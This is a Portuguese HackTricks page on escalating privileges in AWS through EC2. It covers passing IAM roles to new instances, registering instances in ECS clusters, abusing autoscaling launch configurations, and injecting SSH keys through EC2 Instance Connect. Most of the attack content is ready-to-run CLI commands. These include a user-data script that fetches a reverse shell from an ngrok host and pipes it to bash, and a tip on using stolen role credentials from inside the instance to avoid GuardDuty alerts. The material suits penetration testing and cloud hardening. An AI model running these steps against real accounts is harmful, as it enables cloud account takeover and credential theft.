# AWS - EC2 Privesc

<details>

<summary><strong>Apoie o HackTricks e obtenha benef√≠cios!</strong></summary>

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou se deseja acessar a **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm).
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) no github.

</details>

## EC2

Para mais **informa√ß√µes sobre EC2**, confira:

{% content-ref url="../aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/" %}
[aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum](../aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/)
{% endcontent-ref %}

### `iam:PassRole`, `ec2:RunInstances`

Um invasor com as permiss√µes `iam:PassRole` e `ec2:RunInstances` pode **criar uma nova inst√¢ncia EC2** √† qual ter√° acesso ao sistema operacional e **passar um perfil de inst√¢ncia EC2 existente para ela**. Em seguida, ele pode fazer login na inst√¢ncia e **solicitar as chaves AWS associadas aos metadados da inst√¢ncia EC2**, o que lhe d√° acesso a todas as permiss√µes que o perfil de inst√¢ncia associado/role de servi√ßo tem.

* **Acesso via SSH**

Voc√™ pode executar uma nova inst√¢ncia usando uma **chave ssh criada** (`--key-name`) e, em seguida, fazer ssh nela (se voc√™ quiser criar uma nova, talvez precise ter a permiss√£o `ec2:CreateKeyPair`).

```bash
aws ec2 run-instances --image-id ami-a4dc46db --instance-type t2.micro \
    --iam-instance-profile Name=iam-full-access-ip --key-name my_ssh_key \
    --security-group-ids sg-123456
```

* **Acesso via rev shell em user data**

Voc√™ pode executar uma nova inst√¢ncia usando um **user data** (`--user-data`) que enviar√° uma **rev shell** para voc√™. Voc√™ n√£o precisa especificar o grupo de seguran√ßa dessa maneira.

```bash
echo '#!/bin/bash
curl https://reverse-shell.sh/4.tcp.ngrok.io:17031 | bash' > /tmp/rev.sh

aws ec2 run-instances --image-id ami-0c1bc246476a5572b --instance-type t2.micro \
   --iam-instance-profile Name=EC2-CloudWatch-Agent-Role \
   --count 1 \
   --user-data "file:///tmp/rev.sh"
```

Uma observa√ß√£o importante a ser feita sobre esse ataque √© que um **indicador √≥bvio de comprometimento** √© quando as **credenciais do perfil da inst√¢ncia EC2 s√£o usadas fora da inst√¢ncia espec√≠fica**. At√© o AWS GuardDuty dispara nisso (https://docs.aws.amazon.com/guardduty/latest/ug/guardduty\_finding-types.html#unauthorized11), portanto, n√£o √© uma jogada inteligente exfiltrar essas credenciais e execut√°-las localmente, mas sim **acessar a API da AWS de dentro daquela inst√¢ncia EC2**.

**Impacto potencial:** Privesc direto para qualquer papel EC2 anexado a perfis de inst√¢ncia existentes.

#### Privesc para ECS

Com esse conjunto de permiss√µes, voc√™ tamb√©m pode **criar uma inst√¢ncia EC2 e registr√°-la dentro de um cluster ECS**. Dessa forma, os **servi√ßos ECS** ser√£o **executados** dentro da **inst√¢ncia EC2** onde voc√™ tem acesso e, em seguida, voc√™ pode penetrar nesses servi√ßos (cont√™ineres docker) e **roubar as fun√ß√µes ECS anexadas**.

```bash
aws ec2 run-instances \
    --image-id ami-07fde2ae86109a2af \
    --instance-type t2.micro \
    --iam-instance-profile <ECS_role> \
    --count 1 --key-name pwned \
    --user-data "file:///tmp/asd.sh" 

# Certifique-se de usar uma AMI otimizada para ECS, pois ela j√° tem tudo instalado para ECS (amzn2-ami-ecs-hvm-2.0.20210520-x86_64-ebs)
# O perfil da inst√¢ncia EC2 precisa de acesso b√°sico ao ECS
# O conte√∫do do user data √©:
#!/bin/bash
echo ECS_CLUSTER=<cluster-name> >> /etc/ecs/ecs.config;echo ECS_BACKEND_HOST= >> /etc/ecs/ecs.config;
```

Para aprender como **for√ßar os servi√ßos ECS a serem executados** nesta nova inst√¢ncia EC2, confira:

{% content-ref url="aws-ecs-privesc.md" %}
[aws-ecs-privesc.md](aws-ecs-privesc.md)
{% endcontent-ref %}

Se voc√™ **n√£o pode criar uma nova inst√¢ncia** mas tem a permiss√£o `ecs:RegisterContainerInstance`, pode ser capaz de registrar a inst√¢ncia dentro do cluster e realizar o ataque comentado.

**Impact
### `autoscaling:CreateLaunchConfiguration`,`autoscaling:CreateAutoScalingGroup`,`iam:PassRole`

Um atacante com as permiss√µes **`autoscaling:CreateLaunchConfiguration`,`autoscaling:CreateAutoScalingGroup`,`iam:PassRole`** pode **criar uma Configura√ß√£o de Lan√ßamento** com uma **Fun√ß√£o IAM** e um **rev shell** dentro dos **dados do usu√°rio**, em seguida, **criar um grupo de escalonamento autom√°tico** a partir dessa configura√ß√£o e aguardar o rev shell para **roubar a Fun√ß√£o IAM**.

```bash
aws --profile "$NON_PRIV_PROFILE_USER" autoscaling create-launch-configuration \
   --launch-configuration-name bad_config \
   --image-id ami-0c1bc246476a5572b \
   --instance-type t3.micro \
   --iam-instance-profile EC2-CloudWatch-Agent-Role \
   --user-data "$REV"

aws --profile "$NON_PRIV_PROFILE_USER" autoscaling create-auto-scaling-group \
   --auto-scaling-group-name bad_auto \
   --min-size 1 --max-size 1 \
   --launch-configuration-name bad_config \
   --desired-capacity 1 \
   --vpc-zone-identifier "subnet-e282f9b8"
```

**Impacto Potencial:** Privesc direto para uma fun√ß√£o EC2 diferente.

### `!autoscaling`

O conjunto de permiss√µes **`ec2:CreateLaunchTemplate`** e **`autoscaling:CreateAutoScalingGroup`** **n√£o s√£o suficientes para escalar** privil√©gios para uma fun√ß√£o IAM, porque para anexar a fun√ß√£o especificada na Configura√ß√£o de Lan√ßamento ou no Modelo de Lan√ßamento, **voc√™ precisa das permiss√µes `iam:PassRole` e `ec2:RunInstances`** (que √© um privesc conhecido).

### `ec2-instance-connect:SendSSHPublicKey`

Um atacante com a permiss√£o **`ec2-instance-connect:SendSSHPublicKey`** pode adicionar uma chave ssh a um usu√°rio e us√°-la para acess√°-la (se ele tiver acesso ssh √† inst√¢ncia) ou para escalar privil√©gios.

```bash
aws ec2-instance-connect send-ssh-public-key \
   --instance-id "$INSTANCE_ID" \
   --instance-os-user "ec2-user" \
   --ssh-public-key "file://$PUBK_PATH"
```

**Impacto Potencial:** Privesc direto para as fun√ß√µes IAM EC2 anexadas √†s inst√¢ncias em execu√ß√£o.

### `ec2-instance-connect:SendSerialConsoleSSHPublicKey`

Um atacante com a permiss√£o **`ec2-instance-connect:SendSerialConsoleSSHPublicKey`** pode **adicionar uma chave ssh a uma conex√£o serial**. Se a serial n√£o estiver habilitada, o atacante precisa da permiss√£o **`ec2:EnableSerialConsoleAccess` para habilit√°-la**.

Para se conectar √† porta serial, voc√™ tamb√©m **precisa saber o nome de usu√°rio e a senha de um usu√°rio** dentro da m√°quina.

```bash
aws ec2 enable-serial-console-access

aws ec2-instance-connect send-serial-console-ssh-public-key \
   --instance-id "$INSTANCE_ID" \
   --serial-port 0 \
   --region "eu-west-1" \
   --ssh-public-key "file://$PUBK_PATH"

ssh -i /tmp/priv $INSTANCE_ID.port0@serial-console.ec2-instance-connect.eu-west-1.aws
```

Dessa forma, n√£o √© t√£o √∫til para privesc, pois voc√™ precisa saber um nome de usu√°rio e uma senha para explor√°-lo.

**Impacto Potencial:** (Altamente improv√°vel) Privesc direto para as fun√ß√µes IAM EC2 anexadas √†s inst√¢ncias em execu√ß√£o.

<details>

<summary><strong>Apoie o HackTricks e obtenha benef√≠cios!</strong></summary>

* Se voc√™ quiser ver sua **empresa anunciada no HackTricks** ou se quiser acessar a **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Obtenha o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>